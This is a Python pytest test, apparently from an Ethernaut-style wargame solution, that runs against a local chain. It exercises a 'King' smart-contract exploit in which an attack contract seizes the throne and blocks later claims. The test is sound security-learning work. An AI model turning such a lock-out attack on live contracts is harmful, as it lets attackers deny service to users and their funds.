from scripts.king import init_king_deployment, attack_king_contract, claim_throne
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account
from brownie import network, KingOriginal, KingAttack, interface, config, exceptions
from web3 import Web3
import pytest


def test_king_hack():
    # Arrange
    if network.show_active() not in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        pytest.skip("Only for local testing")
    # deploy king contract
    king_contract = init_king_deployment(
        KingOriginal, interface.IKing, instance_address=config["networks"][network.show_active()]["king_instance"]
        )
    original_king = king_contract._king()

    # claim throne before attack:
    new_claimer = get_account(2)
    claim_throne(new_claimer, king_contract, Web3.toWei("0.005", "ether"))
    new_king = king_contract._king()
    
    # Act
    # perform attack
    attack_contract = attack_king_contract(
        attacking_contract=KingAttack,
        deployed_contract = king_contract, 
        amount_to_send=Web3.toWei("1", "ether"),
        )
    king_attacker = king_contract._king()

    # Assert
    # 1) the first claim was successful
    assert new_king != original_king
    # 2.1) attacker is the new king
    assert new_king != king_attacker
    # 2.2) the throne cannot be claimed 
    with pytest.raises(exceptions.VirtualMachineError):
        claim_throne(new_claimer, king_contract, Web3.toWei("2", "ether"))


def main():
    test_king_hack()